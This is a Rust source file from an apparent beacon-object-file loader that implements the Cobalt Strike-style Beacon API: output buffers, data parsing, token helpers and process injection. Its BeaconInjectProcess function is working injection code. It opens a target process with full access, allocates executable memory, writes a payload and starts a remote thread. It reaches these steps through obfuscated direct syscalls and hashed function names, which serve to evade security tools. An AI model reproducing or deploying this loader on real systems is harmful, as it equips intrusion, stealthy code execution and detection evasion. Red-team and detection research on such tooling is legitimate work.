#![allow(non_snake_case)]

use spin::Mutex;
use obfstr::obfstr as s;
use super::{error::CoffeeLdrError, Result};
use alloc::{string::{String, ToString}, vec::Vec};
use core::{
    ffi::{c_void, CStr},
    fmt, alloc::Layout,
    ptr::{null_mut, self},
    ffi::{c_char, c_int, c_short}, 
};

use dinvk::{
    data::OBJECT_ATTRIBUTES, 
    hash::jenkins3, syscall, 
    NtCurrentProcess
};
use windows_sys::Win32::{
    Foundation::{CloseHandle, HANDLE, STATUS_SUCCESS}, 
    Security::{
        GetTokenInformation, RevertToSelf, 
        TokenElevation, TOKEN_ELEVATION, TOKEN_QUERY
    }, 
    System::{ 
        WindowsProgramming::CLIENT_ID,
        Memory::{
            MEM_COMMIT, MEM_RESERVE,
            PAGE_EXECUTE_READWRITE
        }, 
        Threading::{
            OpenProcessToken, SetThreadToken, 
            PROCESS_ALL_ACCESS, PROCESS_INFORMATION, 
            STARTUPINFOA, THREAD_ALL_ACCESS
        },
    }
};

#[allow(dead_code)]
const CALLBACK_OUTPUT: u32 = 0x0;
#[allow(dead_code)]
const CALLBACK_OUTPUT_OEM: u32 = 0x1e;
#[allow(dead_code)]
const CALLBACK_ERROR: u32 = 0x0d;
#[allow(dead_code)]
const CALLBACK_OUTPUT_UTF8: u32 = 0x20;

/// Buffer for storing beacon output.
static BEACON_BUFFER: Mutex<BeaconOutputBuffer> = Mutex::new(BeaconOutputBuffer::new());

/// A buffer used for managing and collecting output for the beacon.
#[repr(C)]
#[derive(Debug, Clone)]
pub struct BeaconOutputBuffer {
    /// Internal buffer that stores the output data as a vector of `c_char`.
    pub buffer: Vec<c_char>,
}

impl BeaconOutputBuffer {
    /// Creates a new, empty `BeaconOutputBuffer`.
    ///
    /// # Returns
    /// 
    /// * A new instance of `BeaconOutputBuffer` with an empty internal buffer. 
    const fn new() -> Self {
        Self { buffer: Vec::new() }
    }

    /// Appends a raw C-style string to the buffer.
    ///
    /// # Arguments
    /// 
    /// * `s` - A pointer to a C-style string (`c_char`).
    /// * `len` - The length of the string to append.
    fn append_char(&mut self, s: *mut c_char, len: c_int) {
        if s.is_null() || len <= 0 {
            return;
        }
        let tmp = unsafe { core::slice::from_raw_parts(s, len as usize) };
        self.buffer.extend_from_slice(tmp);
    }

    /// Appends a Rust `&str` to the buffer.
    ///
    /// # Arguments
    /// 
    /// * `s` - A reference to a Rust string slice (`&str`).
    fn append_string(&mut self, s: &str) {
        self.buffer.extend(s.bytes().map(|b| b as c_char));
    }

    /// Retrieves the current buffer and its size, then clears it.
    ///
    /// # Returns
    /// 
    /// A tuple containing:
    /// * A pointer to the buffer (`*mut c_char`).
    /// * The size of the buffer (`usize`). 
    fn get_output(&mut self) -> (*mut c_char, usize) {
        let size = self.buffer.len();
        let ptr = self.buffer.as_mut_ptr();
        self.buffer.clear(); 
        (ptr, size)
    }

    /// Cleaning the output.
    pub fn clear(&mut self) {
        self.buffer.clear();
    }
}

impl fmt::Display for BeaconOutputBuffer {
    /// Converts the internal buffer into a Rust `String`.
    ///
    /// # Returns
    /// 
    /// * A `String` containing the formatted output from the buffer.
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        let string = self.buffer
            .iter()
            .map(|&c| if c as u8 == 0 { '\n' } else { c as u8 as char })
            .collect::<String>();
        write!(f, "{}", string)
    }
}

#[repr(C)]
#[derive(Debug, Clone, Copy)]
struct Data {
    /// The original buffer [so we can free it]
    original: *mut c_char,
    
    /// Current pointer into our buffer
    buffer: *mut c_char,

    /// Remaining length of data 
    length: c_int,
    
    /// Total size of this buffer
    size: c_int
}

#[repr(C)]
#[derive(Debug, Clone, Copy)]
struct Format {
    /// The original buffer [so we can free it]
    original: *mut c_char,
    
    /// Current pointer into our buffer
    buffer: *mut c_char,

    /// Remaining length of data 
    length: c_int,
    
    /// Total size of this buffer
    size: c_int
}

/// Retrieves the internal address of a function by name.
///
/// # Arguments
///
/// * `name` - The name of the function whose address is being retrieved.
///
/// # Returns
///
/// * `Ok(usize)`: The function's address if found.
/// * `Err(CoffeeLdrError)`: If the function is not found.
pub fn get_function_internal_address(name: &str) -> Result<usize> {
    match jenkins3(name) {
        // Output
        3210322847u32 => Ok(BeaconPrintf as usize),
        358755801u32  => Ok(BeaconOutput as usize),
        2979319955u32 => Ok(BeaconGetOutputData as usize),
        
        // Token
        3202664826u32 => Ok(BeaconIsAdmin as usize),
        233171701u32  => Ok(BeaconUseToken as usize),
        2754379686u32 => Ok(BeaconRevertToken as usize),
        
        // Format
        1870274128u32 => Ok(BeaconFormatInt as usize),
        1617256401u32 => Ok(BeaconFormatFree as usize),
        687949845u32  => Ok(BeaconFormatAlloc as usize),
        305071883u32  => Ok(BeaconFormatReset as usize),
        2824797381u32 => Ok(BeaconFormatPrintf as usize),
        814630661u32  => Ok(BeaconFormatAppend as usize),
        2821454172u32 => Ok(BeaconFormatToString as usize),

        // Process and injection-related operations
        3748796315u32 => Ok(BeaconGetSpawnTo as usize),
        1991785755u32 => Ok(BeaconInjectProcess as usize),
        2335479872u32 => Ok(BeaconCleanupProcess as usize),
        2755057638u32 => Ok(BeaconSpawnTemporaryProcess as usize),
        131483084u32  => Ok(BeaconInjectTemporaryProcess as usize),

        // Data
        1942020652u32 => Ok(BeaconDataInt as usize),
        1136370979u32 => Ok(BeaconDataShort as usize),
        709123669u32  => Ok(BeaconDataParse as usize),
        2194280572u32 => Ok(BeaconDataLength as usize),
        596399976u32  => Ok(BeaconDataExtract as usize),
        275872794u32  => Ok(BeaconDataPtr as usize),

        // Utility functions
        2580203873u32 => Ok(toWideChar as usize),
        3816160102u32 => Ok(0),
        _ =>  Err(CoffeeLdrError::FunctionInternalNotFound(name.to_string()))
    }
}

/// Retrieves the current output buffer and returns a copy of it.
///
/// # Returns
///
/// * `Some(BeaconOutputBuffer)`: A cloned copy of the current output buffer if successful.
/// * `None`: If locking the buffer fails.
pub fn get_output_data() -> Option<BeaconOutputBuffer> {
    let mut beacon = BEACON_BUFFER.lock();
    if beacon.buffer.is_empty() {
        return None;
    }

    let output = beacon.clone();
    beacon.clear();

    Some(output)
}

/// Allocates a new format buffer with the given size.
///
/// # Arguments
///
/// * `format` - A pointer to the `Format` struct.
/// * `max` - The size of the buffer to allocate.
fn BeaconFormatAlloc(format: *mut Format, max: c_int) {
    if format.is_null() || max == 0 {
        return;
    }

    let layout_result = Layout::from_size_align(max as usize, Layout::new::<i8>().align());
    if let Ok(layout) = layout_result {
        let original = unsafe { alloc::alloc::alloc_zeroed(layout).cast::<i8>() };
        unsafe {
            (*format).original = original;
            (*format).buffer = original;
            (*format).length = 0;
            (*format).size = max;
        }
    }
}

/// Resets the given format buffer by zeroing it out.
///
/// # Arguments
///
/// * `format` - A pointer to the `Format` struct.
fn BeaconFormatReset(format: *mut Format) {
    if format.is_null() {
        return;
    }

    unsafe {
        ptr::write_bytes((*format).original, 0, (*format).size as usize);
        (*format).buffer = (*format).original;
        (*format).length = (*format).size;
    }
}

/// Returns the formatted buffer as a C-style string.
///
/// # Arguments
///
/// * `format` - A pointer to the `Format` struct.
/// * `size` - A pointer to an integer that will hold the size of the buffer.
///
/// # Returns
///
/// * Returns a pointer to the formatted buffer, or `null_mut()` if an error occurs.
fn BeaconFormatToString(format: *mut Format, size: *mut c_int) -> *mut c_char {
    if format.is_null() || size.is_null() {
        return null_mut();
    }

    unsafe {
        (*size) = (*format).length;
        (*format).original
    }
}

/// Appends an integer (in big-endian format) to the format buffer.
///
/// # Arguments
///
/// * `format` - A pointer to the `Format` struct.
/// * `value` - The integer to append.
fn BeaconFormatInt(format: *mut Format, value: c_int) {
    if format.is_null() {
        return;
    }

    unsafe {
        if (*format).length + 4 > (*format).size {
            return;
        }
    
        let outdata = swap_endianness(value as u32).to_be_bytes();
        ptr::copy_nonoverlapping(outdata.as_ptr(), (*format).buffer as *mut u8, 4);
    
        (*format).buffer = (*format).buffer.add(4);
        (*format).length += 4;
    }
}

/// Appends raw text data to the format buffer.
///
/// # Arguments
///
/// * `format` - A pointer to the `Format` struct.
/// * `text` - A pointer to the text (`*const c_char`).
/// * `len` - The length of the text.
fn BeaconFormatAppend(format: *mut Format, text: *const c_char, len: c_int) {
    if format.is_null() || text.is_null() || len <= 0 {
        return;
    }

    unsafe {
        if (*format).length + len > (*format).size {
            return;
        }
     
        ptr::copy_nonoverlapping(text, (*format).buffer, len as usize);
        (*format).buffer = (*format).buffer.add(len as usize);
        (*format).length += len;
    }
}

/// Frees the memory allocated for a format buffer.
///
/// # Arguments
///
/// * `format` - A pointer to the `Format` struct.
fn BeaconFormatFree(format: *mut Format) {
    if format.is_null() {
        return;
    }

    unsafe {
        if !(*format).original.is_null() {
            let layout_result = Layout::from_size_align((*format).size as usize, Layout::new::<i8>().align());
            if let Ok(layout) = layout_result {
                alloc::alloc::dealloc((*format).original as *mut u8, layout);
                (*format).original = null_mut();
            }
        }

        (*format).buffer = null_mut();
        (*format).length = 0;
        (*format).size = 0;
    }
}

/// Formats and appends a string to a `Format` buffer using a format string and arguments.
///
/// # Arguments
/// 
/// * `format` - Pointer to the `Format` struct holding the buffer.
/// * `fmt` - Pointer to the C-style format string (`*const c_char`).
/// * `args` - Variable arguments used in formatting.
#[unsafe(no_mangle)]
unsafe extern "C" fn BeaconFormatPrintf(format: *mut Format, fmt: *const c_char, mut args: ...) {
    if format.is_null() || fmt.is_null() {
        return;
    }

    let fmt_str = CStr::from_ptr(fmt).to_str().unwrap_or("");
    let mut temp_str = String::new();
    
    printf_compat::format(fmt_str.as_ptr().cast(), args.as_va_list(), printf_compat::output::fmt_write(&mut temp_str));

    let length_needed = temp_str.len() as c_int;
    if (*format).length + length_needed >= (*format).size {
        return;
    }

    ptr::copy_nonoverlapping(
        temp_str.as_ptr() as *const c_char,
        (*format).buffer.add((*format).length as usize),
        length_needed as usize
    );

    (*format).length += length_needed;
}

/// Extracts a 2-byte short value from the data buffer.
///
/// # Arguments
///
/// * `data` - A pointer to the `Data` struct.
///
/// # Returns
///
/// * The extracted short value, or 0 if extraction fails.
fn BeaconDataShort(data: *mut Data) -> c_short {
    if data.is_null() {
        return 0;
    }

    let parser = unsafe { &mut *data };
    if parser.length < 2 {
        return 0;
    }

    let result = unsafe { ptr::read_unaligned(parser.buffer as *const i16) };
    parser.buffer = unsafe { parser.buffer.add(2) };
    parser.length -= 2;

    result as c_short
}

/// Extracts a 4-byte integer from the data buffer.
/// 
/// # Arguments
/// 
/// * `data` - A pointer to the `Data` struct containing the buffer.
/// 
/// # Returns
/// 
/// * The extracted integer, or 0 if extraction fails.
fn BeaconDataInt(data: *mut Data) -> c_int {
    if data.is_null() {
        return 0;
    }

    let parser = unsafe { &mut *data };
    if parser.length < 4 {
        return 0;
    }

    let result = unsafe { ptr::read_unaligned(parser.buffer as *const i32) };
    parser.buffer = unsafe { parser.buffer.add(4) };
    parser.length -= 4;

    result as c_int
}

/// Extracts a variable-length data buffer from the `Data` struct.
/// 
/// # Arguments
/// 
/// * `data` - A pointer to the `Data` struct containing the buffer.
/// * `size` - A mutable pointer to store the size of the extracted data.
/// 
/// # Returns
/// 
/// * Pointer to the extracted data, or `null_mut()` if extraction fails.
fn BeaconDataExtract(data: *mut Data, size: *mut c_int) -> *mut c_char {
    if data.is_null() {
        return null_mut();
    }
    
    let parser= unsafe { &mut *data };
    if parser.length < 4 {
        return null_mut();
    }

    let length = unsafe { ptr::read_unaligned(parser.buffer as *const u32) };
    let outdata = unsafe { parser.buffer.add(4) };
    if outdata.is_null() {
        return null_mut();
    }

    parser.buffer = unsafe { parser.buffer.add(4 + length as usize) };
    parser.length -= 4 + length as c_int;
    if !size.is_null() && !outdata.is_null() {
        unsafe {
            *size = length as c_int;
        }
    }

    outdata as *mut c_char
}

/// Initializes the data parser by setting the buffer and size.
/// 
/// # Arguments
/// 
/// * `data` - A pointer to the `Data` struct to be initialized.
/// * `buffer` - A pointer to the buffer to be parsed.
/// * `size` - The size of the buffer in bytes.
fn BeaconDataParse(data: *mut Data, buffer: *mut c_char, size: c_int) {
    if data.is_null() {
        return;
    }

    unsafe {
        (*data).original = buffer;
        (*data).buffer = buffer.add(4);
        (*data).length = size - 4;
        (*data).size = size - 4;
    }
}

/// Returns the current length of the data buffer.
/// 
/// # Arguments
/// 
/// * `data` - A constant pointer to the `Data` struct.
/// 
/// # Returns
/// 
/// * The remaining length of the buffer.
fn BeaconDataLength(data: *const Data) -> c_int {
    if data.is_null() {
        return 0;
    }

    unsafe { 
        (*data).length 
    }
}

/// Retrieves the output data and its size from an internal buffer.
/// 
/// # Arguments
/// 
/// * `outsize` - A mutable pointer to store the size of the output data.
/// 
/// # Returns
/// 
/// * Pointer to the output data, or `null_mut()` if retrieval fails.
fn BeaconGetOutputData(outsize: *mut c_int) -> *mut c_char {
    unsafe {
        let mut beacon = BEACON_BUFFER.lock();
        let (ptr, size) = beacon.get_output();

        if !outsize.is_null() {
            *outsize = size as c_int;
        }

        ptr
    }
}

/// Appends output data to an internal buffer.
/// 
/// # Arguments
/// 
/// * `_type` - An integer representing the type of data being output.
/// * `data` - A pointer to the output data.
/// * `len` - The length of the output data.
fn BeaconOutput(_type: c_int, data: *mut c_char, len: c_int) {
    let mut buffer = BEACON_BUFFER.lock();
    buffer.append_char(data, len);
}

/// Prints formatted output to an internal buffer.
/// 
/// # Arguments
/// 
/// * `_type` - The type of output.
/// * `fmt` - A format string.
/// * `args` - Variable arguments list for formatting.
#[unsafe(no_mangle)]
unsafe extern "C" fn BeaconPrintf(_type: c_int, fmt: *mut c_char, mut args: ...) {
   let mut str = String::new();
    printf_compat::format(fmt, args.as_va_list(), printf_compat::output::fmt_write(&mut str));
    str.push('\0');

    let mut buffer = BEACON_BUFFER.lock();
    buffer.append_string(&str);
}

/// Reverts the current process token to its original state.
/// 
/// This function attempts to revert the current process token and logs a warning if it fails.
fn BeaconRevertToken() {
    unsafe {
        if RevertToSelf() == 0 {   
            super::warn!("RevertToSelf Failed!")
        }
    }
}

/// Sets the current thread token.
/// 
/// # Arguments
/// 
/// * `token` - A handle to the token to be applied to the current thread.
/// 
/// # Returns
/// 
/// *  Returns a non-zero value on success, or 0 on failure.
fn BeaconUseToken(token: HANDLE) -> i32 {
    unsafe { SetThreadToken(null_mut(), token) }
}

/// Cleans up a process by closing its handles.
/// 
/// # Arguments
/// 
/// * A pointer to a `PROCESS_INFORMATION` struct containing process handles.
fn BeaconCleanupProcess(info: *const PROCESS_INFORMATION) {
    unsafe {
        CloseHandle((*info).hProcess);
        CloseHandle((*info).hThread);
    }
}

/// Checks if the current process is running with elevated privileges (as an admin).
/// 
/// # Returns
/// 
/// * Returns 1 if the process is elevated, otherwise 0.
fn BeaconIsAdmin() -> u32 {
    let mut h_token = null_mut();
    
    unsafe {
        if OpenProcessToken(NtCurrentProcess(), TOKEN_QUERY, &mut h_token) != 0 { 
            let mut elevation = TOKEN_ELEVATION { TokenIsElevated: 0 };
            let mut return_length = 0;

            if GetTokenInformation(
                h_token, 
                TokenElevation, 
                &mut elevation as *mut _ as *mut c_void, 
                size_of::<TOKEN_ELEVATION>() as u32, 
                &mut return_length
            ) != 0 {
                return (elevation.TokenIsElevated == 1) as u32
            }
        }
    }

    0
}

/// Swaps the endianness of a 32-bit unsigned integer.
/// 
/// # Arguments
/// 
/// * `src` - A 32-bit unsigned integer to be converted.
/// 
/// # Returns
/// 
/// * The integer with swapped endianness.
fn swap_endianness(src: u32) -> u32 {
    // Check if the system is little-endian
    if cfg!(target_endian = "little") {
        // Small-endian to large-endian converter
        src.swap_bytes()
    } else {
        // If it is already big-endian, it returns the original value
        src
    }
}

/// Converts a C-style string to a wide character (UTF-16) string.
/// 
/// # Arguments
/// 
/// * `src` - A pointer to the source C-style string.
/// * `dst` - A pointer to the destination buffer for wide characters.
/// * `max` - The maximum size of the destination buffer in bytes.
/// 
/// # Returns
/// 
/// * Returns 1 on success or 0 on failure. 
fn toWideChar(src: *const c_char, dst: *mut u16, max: c_int) -> c_int {
    if src.is_null() || dst.is_null() || max < size_of::<u16>() as c_int {
        return 0;
    }

    unsafe {
        // Converting the `src` pointer to a C string (`CStr`)
        let c_str = CStr::from_ptr(src);
        
        // Converts CStr to a Rust string (&str)
        if let Ok(str_slice) = c_str.to_str() {

            // Encoding a Rust string as UTF-16
            let utf16_chars  = str_slice.encode_utf16().collect::<Vec<u16>>();
            let dst_slice = core::slice::from_raw_parts_mut(dst, (max as usize) / size_of::<u16>());

            let num_chars = utf16_chars.len();
            if num_chars >= dst_slice.len() {
                return 0; // Not enough space
            }

            // Copy the UTF-16 characters to the destination buffer
            dst_slice[..num_chars].copy_from_slice(&utf16_chars);

            // Adds the null-terminator
            dst_slice[num_chars] = 0;
        }
    }

    1
}

/// Injects a payload into a remote process.
/// 
/// # Arguments
/// 
/// * `_h_process` - A handle to the target process.
/// * `pid` - The process ID of the target process.
/// * `payload` - A pointer to the payload data to be injected.
/// * `len` - The length of the payload.
/// * `_offset` - The offset into the payload.
/// * `_arg` - Additional arguments for the injection.
/// * `_a_len` - Length of the additional arguments.
fn BeaconInjectProcess(
    _h_process: HANDLE, 
    pid: c_int, 
    payload: *const c_char, 
    len: c_int, 
    _offset: c_char, 
    _arg: *const c_char, 
    _a_len: c_int
) {
    if payload.is_null() || len <= 0 {
        return;
    }
    
    unsafe {
        let mut oa = OBJECT_ATTRIBUTES::default();
        let mut ci = CLIENT_ID {
            UniqueProcess: pid as HANDLE,
            UniqueThread: null_mut(),
        };

        let mut h_process = null_mut::<c_void>();
        let status = syscall!(s!("NtOpenProcess"), &mut h_process, PROCESS_ALL_ACCESS, &mut oa, &mut ci);
        if status != Some(STATUS_SUCCESS) {
            return;
        }

        let mut size = len as usize;
        let mut address = null_mut::<c_void>();
        let mut status = syscall!(
            s!("NtAllocateVirtualMemory"), 
            h_process, 
            &mut address, 
            0, 
            &mut size, 
            MEM_COMMIT | MEM_RESERVE, 
            PAGE_EXECUTE_READWRITE
        );

        if status != Some(STATUS_SUCCESS) {
            CloseHandle(h_process);
            return;
        }
         
        let mut now = 0usize;
        status = syscall!(s!("NtWriteVirtualMemory"), h_process, address, payload as *const c_void, len as usize, &mut now);
        if status != Some(STATUS_SUCCESS) {
            CloseHandle(h_process);
            return;
        }
        
        let mut h_thread = null_mut::<c_void>();
        status = syscall!(
            s!("NtCreateThreadEx"), 
            &mut h_thread, 
            THREAD_ALL_ACCESS, 
            null_mut::<c_void>(), 
            h_process, 
            address, 
            null_mut::<c_void>(), 
            0usize, 
            0usize, 
            0usize, 
            0usize, 
            null_mut::<c_void>()
        );

        if status != Some(STATUS_SUCCESS) || h_thread.is_null() {
            CloseHandle(h_process);
            return;
        }

        CloseHandle(h_thread);
        CloseHandle(h_process);
    }
}

/// Extracts a pointer to a section of the data buffer.
///
/// # Arguments
///
/// * `data` - A pointer to the `Data` struct containing the buffer.
/// * `size` - The number of bytes to extract.
///
/// # Returns
///
/// * A pointer to the requested section of the buffer, or `null_mut()` if extraction fails.
fn BeaconDataPtr(data: *mut Data, size: c_int) -> *mut c_char {
    if data.is_null() || size <= 0 {
        return null_mut();
    }

    let parser = unsafe { &mut *data };
    if parser.length < size {
        return null_mut();
    }

    let result = parser.buffer;
    parser.buffer = unsafe { parser.buffer.add(size as usize) };
    parser.length -= size;

    result
}

/// Leaving this to be implemented by people needing/wanting it
fn BeaconInjectTemporaryProcess(_info: *const PROCESS_INFORMATION, _payload: *const c_char, _len: c_int, _offset: c_int, _arg: *const c_char, _a_len: c_int) {
    unimplemented!()
}

/// Leaving this to be implemented by people needing/wanting it
fn BeaconSpawnTemporaryProcess(_x86: i32, _ignore_token: i32, _s_info: *mut STARTUPINFOA, _p_info: *mut PROCESS_INFORMATION) {
    unimplemented!()
}

/// Leaving this to be implemented by people needing/wanting it
fn BeaconGetSpawnTo(_x86: i32, _buffer: *const c_char, _length: c_int) {
    unimplemented!()
}
